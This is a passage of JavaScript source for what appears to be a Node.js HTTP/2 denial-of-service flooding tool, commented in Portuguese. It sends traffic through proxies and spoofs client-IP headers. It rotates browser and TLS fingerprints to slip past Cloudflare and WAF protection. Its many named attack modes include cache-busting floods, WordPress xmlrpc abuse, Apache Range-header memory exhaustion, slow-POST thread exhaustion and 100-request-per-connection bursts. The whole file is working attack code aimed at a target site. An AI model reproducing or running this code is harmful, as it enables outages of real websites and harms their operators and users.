    duckduckgo: {
        ":method": "GET",
        ":authority": Math.random() < 0.5 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
        "sec-ch-ua": `"DuckDuckGo";v="${Math.floor(115 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
        "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
        "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Android",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "user-agent": `Mozilla/5.0 (${Math.random() < 0.5 ? "Windows NT 10.0; Win64; x64" : "Linux; Android 11"}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 DuckDuckGo/${Math.floor(10 + Math.random() * 5)}.0`,
        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://duckduckgo.com/",
        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "dnt": "1",
        "upgrade-insecure-requests": "1",
        "cache-control": "max-age=0"
}
};

    return headersMap[browser];
};
const browser = getRandomBrowser();
const headers = generateHeaders(browser);
let h2_config;
const h2settings = h2Settings(browser);
h2_config = transformSettings(Object.entries(h2settings));
function getWeightedRandom() {
    const randomValue = Math.random() * Math.random();
    return randomValue < 0.25;
}
const randomString = randstr(10);

                        const headers4 = {
                            ...(getWeightedRandom() && Math.random() < 0.4 && { 'x-forwarded-for': `${randomString}:${randomString}` }),
                            ...(getWeightedRandom() && { 'referer': `https://${randomString}.com` })
                        }

                        let allHeaders = Object.assign({}, headers, headers4);


const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: `${parsedTarget.host}:443`,
    timeout: 10
};

// ==================== MÉTODOS EXISTENTES ====================

// GATLING - Headers dinâmicos por requisição
function gatlingHeaders() {
    const extraHeaders = {
        "X-Forwarded-For": `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
        "X-Real-IP": `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
        "X-Client-IP": `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
        "CF-Connecting-IP": `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
        "X-Originating-IP": `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
    };
    const randomKey = Object.keys(extraHeaders)[Math.floor(Math.random() * Object.keys(extraHeaders).length)];
    return { [randomKey]: extraHeaders[randomKey] };
}

// CACHEBYPASS - Força cache miss
function cacheBypassHeaders() {
    return {
        "Cache-Control": "no-cache, no-store, must-revalidate, max-age=0",
        "Pragma": "no-cache",
        "Expires": "0",
        "If-Modified-Since": new Date(Date.now() - 86400000 * 30).toUTCString(),
        "If-None-Match": `"${Math.random().toString(36).substring(2, 15)}"`
    };
}

// HYPER-PULSE / RAILGUN-PULSE - Burst controlado
let burstActive = false;
let burstTimer = null;

function pulseBurst(callback) {
    if (burstActive) return;
    burstActive = true;
    const burstCount = Math.floor(Math.random() * 20) + 10;
    const burstInterval = Math.floor(Math.random() * 50) + 10;
    let sent = 0;
    const burstId = setInterval(() => {
        if (sent >= burstCount) {
            clearInterval(burstId);
            burstActive = false;
            if (burstTimer) {
                clearTimeout(burstTimer);
                burstTimer = null;
            }
            const cooldown = Math.floor(Math.random() * 500) + 200;
            burstTimer = setTimeout(() => {
                burstTimer = null;
                pulseBurst(callback);
            }, cooldown);
            return;
        }
        callback();
        sent++;
    }, burstInterval);
}

// XMLRPC - WordPress xmlrpc.php exploit
function xmlrpcPayload() {
    const methods = ["system.multicall", "pingback.ping", "wp.getUsersBlogs", "wp.getCategories", "metaWeblog.getRecentPosts"];
    const method = methods[Math.floor(Math.random() * methods.length)];
    const xml = `<?xml version="1.0"?><methodCall><methodName>${method}</methodName><params><param><value><string>${generateRandomString(5,15)}</string></value></param></params></methodCall>`;
    return xml;
}

// APACHE - Range header memory exhaustion
function apacheRangeHeaders() {
    const ranges = [];
    for (let i = 0; i < 100; i++) {
        const start = Math.floor(Math.random() * 1000000);
        const end = start + Math.floor(Math.random() * 5000);
        ranges.push(`${start}-${end}`);
    }
    return {
        "Range": `bytes=${ranges.join(", ")}`,
        "If-Range": new Date(Date.now() - 86400000 * 30).toUTCString()
    };
}

// NUCLEAR - Multi-method combo
function nuclearHeaders() {
    const methods = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH"];
    const method = methods[Math.floor(Math.random() * methods.length)];
    const combo = {
        ...cacheBypassHeaders(),
        ...gatlingHeaders(),
        ...apacheRangeHeaders()
    };
    if (method === "POST" || method === "PUT" || method === "PATCH") {
        const bodySize = Math.floor(Math.random() * 50000) + 1000;
        combo["Content-Length"] = bodySize.toString();
        combo["Content-Type"] = Math.random() < 0.5 ? "application/x-www-form-urlencoded" : "multipart/form-data; boundary=----WebKitFormBoundary" + generateRandomString(6,12);
    }
    return { method, combo };
}

// OMEGA - Adaptive flood (varia intensidade)
let omegaLevel = 1;
let omegaDirection = 1;

function omegaAdapt() {
    const target = Math.floor(Math.random() * 5) + 1;
    if (omegaLevel < target) omegaDirection = 1;
    else if (omegaLevel > target) omegaDirection = -1;
    omegaLevel += omegaDirection * (Math.random() < 0.3 ? 1 : 0);
    if (omegaLevel < 1) omegaLevel = 1;
    if (omegaLevel > 5) omegaLevel = 5;
    return Math.floor(omegaLevel);
}

// RUDY - Slow POST (exaure threads)
function rudyPost() {
    const chunkSize = Math.floor(Math.random() * 100) + 1;
    const totalSize = Math.floor(Math.random() * 50000) + 5000;
    const chunks = Math.floor(totalSize / chunkSize);
    let body = "";
    for (let i = 0; i < chunks; i++) {
        body += "x".repeat(chunkSize);
        if (i < chunks - 1) body += "\r\n";
    }
    return body;
}

// CFSTORM - 6 métodos combinados
function cfStormHeaders() {
    const methods = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE"];
    const method = methods[Math.floor(Math.random() * methods.length)];
    const storm = {
        ...cacheBypassHeaders(),
        ...gatlingHeaders(),
        "X-Forwarded-Proto": Math.random() < 0.5 ? "https" : "http",
        "X-Forwarded-Host": parsedTarget.host,
        "X-Forwarded-Port": Math.random() < 0.5 ? "443" : "80",
        "X-Original-URL": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5,10),
        "X-Rewrite-URL": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5,10)
    };
    if (method === "POST") {
        const bodySize = Math.floor(Math.random() * 20000) + 500;
        storm["Content-Length"] = bodySize.toString();
        storm["Content-Type"] = "application/x-www-form-urlencoded";
    }
    return { method, storm };
}

// ==================== NOVOS MÉTODOS ADICIONADOS ====================

// BYPASS - Generic WAF bypass (JA3 rotate) + Realistic browser bypass
function bypassHeaders() {
    const ja3Fingerprints = [
        "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
        "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,5-10-11-13-23-27-35-43-45-51-17513-65281,29-23-24,0",
        "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-5-10-11-13-16-18-23-27-35-43-45-51-17513-65281,29-23-24,0",
        "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-41,29-23-24,0"
    ];
    
    const randomJA3 = ja3Fingerprints[Math.floor(Math.random() * ja3Fingerprints.length)];
    
    const extraHeaders = {
        "Accept-Language": randomElement(["en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Sec-Fetch-Dest": randomElement(["document", "empty", "image"]),
        "Sec-Fetch-Mode": randomElement(["navigate", "cors", "no-cors"]),
        "Sec-Fetch-Site": randomElement(["none", "same-origin", "cross-site"]),
        "Upgrade-Insecure-Requests": "1",
        "X-Requested-With": "XMLHttpRequest",
        "X-Forwarded-For": `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
    };
    
    return extraHeaders;
}

// REALBYPASS - Realistic browser bypass
function realBypassHeaders() {
    const browsers = [
        {
            ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            secChUa: '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
        },
        {
            ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            secChUa: '"Safari";v="17", "AppleWebKit";v="605"'
        },
        {
            ua: "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
            accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            secChUa: '"Firefox";v="121", "Gecko";v="20100101"'
        }
    ];
    
    const browser = browsers[Math.floor(Math.random() * browsers.length)];
    
    return {
        "User-Agent": browser.ua,
        "Accept": browser.accept,
        "Sec-Ch-Ua": browser.secChUa,
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": randomElement(['"Windows"', '"macOS"', '"Linux"']),
        "Accept-Language": randomElement(["en-US,en;q=0.9", "en-GB,en;q=0.8"]),
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "X-Forwarded-For": `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
    };
}

// CFBYPASS - Cloudflare UAM bypass (uTLS)
function cfBypassHeaders() {
    return {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "X-Forwarded-For": `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
        "CF-Connecting-IP": `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
        "CF-IPCountry": randomElement(["US", "GB", "DE", "FR", "JP"]),
        "CF-Visitor": '{"scheme":"https"}',
        "CDN-Loop": "cloudflare"
    };
}

// STEALTH - Stealth H2, low WAF signature
function stealthHeaders() {
    const orderVariations = [
        [":method", ":authority", ":scheme", ":path", "user-agent", "accept", "accept-language", "accept-encoding", "cache-control"],
        [":method", ":scheme", ":path", ":authority", "accept", "user-agent", "accept-encoding", "accept-language", "cache-control"],
        [":method", ":path", ":scheme", ":authority", "accept-encoding", "accept-language", "user-agent", "accept", "cache-control"]
    ];
    
    const order = orderVariations[Math.floor(Math.random() * orderVariations.length)];
    
    const stealthHeadersObj = {};
    order.forEach(header => {
        switch(header) {
            case ":method":
                stealthHeadersObj[header] = "GET";
                break;
            case ":authority":
                stealthHeadersObj[header] = parsedTarget.host;
                break;
            case ":scheme":
                stealthHeadersObj[header] = "https";
                break;
            case ":path":
                stealthHeadersObj[header] = parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5,10);
                break;
            case "user-agent":
                stealthHeadersObj[header] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36";
                break;
            case "accept":
                stealthHeadersObj[header] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
                break;
            case "accept-language":
                stealthHeadersObj[header] = "en-US,en;q=0.5";
                break;
            case "accept-encoding":
                stealthHeadersObj[header] = "gzip, deflate, br";
                break;
            case "cache-control":
                stealthHeadersObj[header] = "max-age=0";
                break;
        }
    });
    
    return stealthHeadersObj;
}

// RAILGUN - 100 req per TCP (super eficiente)
function railgunRequest(client, dynHeaders) {
    const streamId = getRandomInt(3, 2147483647);
    const requests = [];
    const reqCount = 100; // 100 requisições por conexão TCP
    
    for (let i = 0; i < reqCount; i++) {
        const packed = Buffer.concat([
            Buffer.from([0x80, 0, 0, 0, 0xFF]),
            new HPACK().encode(dynHeaders)
        ]);
        
        const frame = encodeFrame(streamId + i, 1, packed, 0x1 | 0x4 | 0x20);
        const req = client.request(dynHeaders);
        req.end();
        
        req.on('response', () => {
            req.close();
            req.destroy();
        });
        
        setTimeout(() => {
            req.close();
            req.destroy();
        }, 1000);
    }
}

// PIPELINE - HTTP pipeline, max throughput
function pipelineRequest(client, dynHeaders) {
    const pipelineDepth = 10;
    const requests = [];
    
    for (let i = 0; i < pipelineDepth; i++) {
        const streamId = getRandomInt(3, 2147483647);
        const packed = Buffer.concat([
            Buffer.from([0x80, 0, 0, 0, 0xFF]),
            new HPACK().encode(dynHeaders)
        ]);
        
        const frame = encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20);
        requests.push(frame);
    }
    
    client.write(Buffer.concat(requests));
}

// STRESS - L7-POST flood, bandwidth exhaust
function stressPOST() {
    const bodySize = Math.floor(Math.random() * 500000) + 100000; // 100KB - 600KB
    const body = "x".repeat(bodySize);
    
    return {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": bodySize.toString(),
            "Transfer-Encoding": "chunked"
        },
        body: body
    };
}

// HYPER - High concurrency HTTP
function hyperRequest(client, dynHeaders) {
    const concurrency = 200;
    const requests = [];
    
    for (let i = 0; i < concurrency; i++) {
        const streamId = getRandomInt(3, 2147483647);
        const req = client.request(dynHeaders);
        req.end();
        
        req.on('response', () => {
            req.close();
            req.destroy();
        });
        
        setTimeout(() => {
            req.close();
            req.destroy();
        }, 1000);
    }
}

// HYPERAW - Raw HTTP/2 push flood
function hyperawHeaders() {
    return {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5,10),
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    };
}

// ==================== FIM DOS NOVOS MÉTODOS ====================

Socker.HTTP(proxyOptions, async (connection, error) => {
    if (error) return;
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true);

    const settings = {
        initialWindowSize: 15663105,
    };

    const tlsOptions = {
        secure: true,
        ALPNProtocols: ["h2", "http/1.1"],
        ciphers: cipper,
        requestCert: true,
        sigalgs: sigalgs,
        socket: connection,
        ecdhCurve: ecdhCurve,
        secureContext: secureContext,
        honorCipherOrder: false,
        rejectUnauthorized: false,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        secureOptions: secureOptions,
        host: parsedTarget.host,
        servername: parsedTarget.host,
    };
    
    const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
    
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.setMaxListeners(0);
    
    function generateJA3Fingerprint(socket) {
        const cipherInfo = socket.getCipher();
        const supportedVersions = socket.getProtocol();
    
        if (!cipherInfo) {
            return null;
        }
    
        const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
    
        const md5Hash = crypto.createHash('md5');
        md5Hash.update(ja3String);
    
        return md5Hash.digest('hex');
    }
    
    tlsSocket.on('connect', () => {
        const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
    });
    let hpack = new HPACK();
    let client;
    client = http2.connect(parsedTarget.href, {
        protocol: "https",
        createConnection: () => tlsSocket,
        settings : h2settings,
        socket: tlsSocket,
    });
    
    client.setMaxListeners(0);
    
    const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
    client.on('remoteSettings', (settings) => {
        const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
        client.setLocalWindowSize(localWindowSize, 0);
    });
    
    const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
    const frames = [
        Buffer.from(PREFACE, 'binary'),
        encodeFrame(0, 4, encodeSettings([...h2_config])),
        encodeFrame(0, 8, updateWindow)
    ];
    
    client.on('connect', async () => {
        const methodPool = [
            "gatling", "cachebypass", "pulse", "xmlrpc", "apache", 
            "nuclear", "omega", "rudy", "cfstorm", "bypass", "realbypass",
            "cfbypass", "stealth", "railgun", "pipeline", "stress",
            "hyper", "hyperaw"
        ];
        let currentMethod = methodPool[Math.floor(Math.random() * methodPool.length)];
        
        const intervalId = setInterval(async () => {
            if (Math.random() < 0.3) {
                currentMethod = methodPool[Math.floor(Math.random() * methodPool.length)];
            }
            
            const shuffleObject = (obj) => {
                const keys = Object.keys(obj);
                for (let i = keys.length - 1; i > 0; i--) {
                    const j = Math.floor(Math.random() * (i + 1));
                    [keys[i], keys[j]] = [keys[j], keys[i]];
                }
                const shuffledObj = {};
                keys.forEach(key => shuffledObj[key] = obj[key]);
                return shuffledObj;
            };
    
            const randomItem = (array) => array[Math.floor(Math.random() * array.length)];
            
            let baseHeaders = { ...allHeaders };
            let methodHeaders = {};
            let extraMethod = "GET";
            let bodyData = null;
            
            switch(currentMethod) {
                case "gatling":
                    methodHeaders = gatlingHeaders();
                    break;
                case "cachebypass":
                    methodHeaders = cacheBypassHeaders();
                    break;
                case "pulse":
                    methodHeaders = gatlingHeaders();
                    break;
                case "xmlrpc":
                    extraMethod = "POST";
                    methodHeaders = {
                        "Content-Type": "text/xml",
                        "Content-Length": xmlrpcPayload().length.toString(),
                        "Accept": "text/xml"
                    };
                    bodyData = xmlrpcPayload();
                    break;
                case "apache":
                    methodHeaders = apacheRangeHeaders();
                    break;
                case "nuclear": {
                    const nuclear = nuclearHeaders();
                    extraMethod = nuclear.method;
                    methodHeaders = nuclear.combo;
                    if (extraMethod !== "GET" && extraMethod !== "HEAD") {
                        const bodySize = Math.floor(Math.random() * 50000) + 1000;
                        bodyData = "x".repeat(bodySize);
                    }
                    break;
                }
                case "omega": {
                    const level = omegaAdapt();
                    methodHeaders = gatlingHeaders();
                    if (level > 3) {
                        methodHeaders = { ...methodHeaders, ...cacheBypassHeaders() };
                    }
                    if (level > 4) {
                        methodHeaders = { ...methodHeaders, ...apacheRangeHeaders() };
                    }
                    break;
                }
                case "rudy": {
                    extraMethod = "POST";
                    const body = rudyPost();
                    methodHeaders = {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Content-Length": body.length.toString()
                    };
                    bodyData = body;
                    break;
                }
                case "cfstorm": {
                    const storm = cfStormHeaders();
                    extraMethod = storm.method;
                    methodHeaders = storm.storm;
                    if (extraMethod === "POST") {
                        const bodySize = Math.floor(Math.random() * 20000) + 500;
                        bodyData = "x".repeat(bodySize);
                    }
                    break;
                }
                case "bypass":
                    methodHeaders = bypassHeaders();
                    break;
                case "realbypass":
                    methodHeaders = realBypassHeaders();
                    break;
                case "cfbypass":
                    methodHeaders = cfBypassHeaders();
                    break;
                case "stealth":
                    methodHeaders = stealthHeaders();
                    break;
                case "railgun":
                    methodHeaders = gatlingHeaders();
                    break;
                case "pipeline":
                    methodHeaders = gatlingHeaders();
                    break;
                case "stress": {
                    const stress = stressPOST();
                    extraMethod = stress.method;
                    methodHeaders = stress.headers;
                    bodyData = stress.body;
                    break;
                }
                case "hyper":
                    methodHeaders = gatlingHeaders();
                    break;
                case "hyperaw":
                    methodHeaders = hyperawHeaders();
                    break;
                default:
                    methodHeaders = {};
            }
            
            if (currentMethod === "pulse") {
                pulseBurst(() => {
                    const dynHeaders = shuffleObject({
                        ...baseHeaders,
                        ...methodHeaders,
                        ...(Math.random() < 0.5 ? {"Cache-Control": "max-age=0"} :{}),
                        ...(Math.random() < 0.5 ? {["MOMENT" + randstr(4)]: "POLOM" + generateRandomString(1,5) } : {["X-FRAMES" + generateRandomString(1,4)]: "NAVIGATE"+ randstr(3)})
                    });
                    
                    if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                        const req = client.request(dynHeaders);
                        if (bodyData) req.write(bodyData);
                        req.end();
                        req.on('response', () => { req.close(); req.destroy(); });
                        req.on('end', () => { req.close(); req.destroy(); });
                        setTimeout(() => { req.close(); req.destroy(); }, 1000);
                    }
                });
                return;
            }
            
            if (currentMethod === "railgun") {
                const dynHeaders = shuffleObject({
                    ...baseHeaders,
                    ...methodHeaders,
                    ...(Math.random() < 0.5 ? {"Cache-Control": "max-age=0"} :{})
                });
                
                if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                    railgunRequest(client, dynHeaders);
                }
                return;
            }
            
            if (currentMethod === "pipeline") {
                const dynHeaders = shuffleObject({
                    ...baseHeaders,
                    ...methodHeaders,
                    ...(Math.random() < 0.5 ? {"Cache-Control": "max-age=0"} :{})
                });
                
                if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                    pipelineRequest(client, dynHeaders);
                }
                return;
            }
            
            if (currentMethod === "hyper") {
                const dynHeaders = shuffleObject({
                    ...baseHeaders,
                    ...methodHeaders,
                    ...(Math.random() < 0.5 ? {"Cache-Control": "max-age=0"} :{})
                });
                
                if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                    hyperRequest(client, dynHeaders);
                }
                return;
            }
            
            const dynHeaders = shuffleObject({
                ...baseHeaders,
                ...methodHeaders,
                ...(extraMethod !== "GET" && extraMethod !== "HEAD" ? {":method": extraMethod} : {}),
                ...(Math.random() < 0.5 ? {"Cache-Control": "max-age=0"} :{}),
                ...(Math.random() < 0.5 ? {["MOMENT" + randstr(4)]: "POLOM" + generateRandomString(1,5) } : {["X-FRAMES" + generateRandomString(1,4)]: "NAVIGATE"+ randstr(3)})
            });
    
            const packed = Buffer.concat([
                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                hpack.encode(dynHeaders)
            ]);
    
            const streamId = 1;
            const requests = [];
            let count = 0;
    
            if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                let effectiveRate = args.Rate;
                if (currentMethod === "xmlrpc" || currentMethod === "rudy" || currentMethod === "stress") {
                    effectiveRate = Math.floor(args.Rate * 0.3);
                } else if (currentMethod === "nuclear" || currentMethod === "cfstorm") {
                    effectiveRate = Math.floor(args.Rate * 0.5);
                } else if (currentMethod === "apache") {
                    effectiveRate = Math.floor(args.Rate * 0.7);
                }
                if (effectiveRate < 1) effectiveRate = 1;
                
                for (let i = 0; i < effectiveRate; i++) {
                    const requestPromise = new Promise((resolve, reject) => {
                        const req = client.request(dynHeaders);
                        if (bodyData) req.write(bodyData);
                        req.end();
                        req.on('response', response => {
                            req.close();
                            req.destroy();
                            resolve();
                        });
                        req.on('end', () => {
                            count++;
                            if (count === args.time * effectiveRate) {
                                clearInterval(intervalId);
                                client.close(http2.constants.NGHTTP2_CANCEL);
                            }
                            reject(new Error('Request timed out'));
                        });
                        setTimeout(() => {
                            req.close();
                            req.destroy();
                            resolve();
                        }, 5000);
                    });
    
                    const frame = encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20);
                    requests.push({ requestPromise, frame });
                }
    
                await Promise.all(requests.map(({ requestPromise }) => requestPromise));
                client.write(Buffer.concat(frames));
            }
        }, 500);  
    });
    
        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return;
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return;
        });
        });
    }
const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});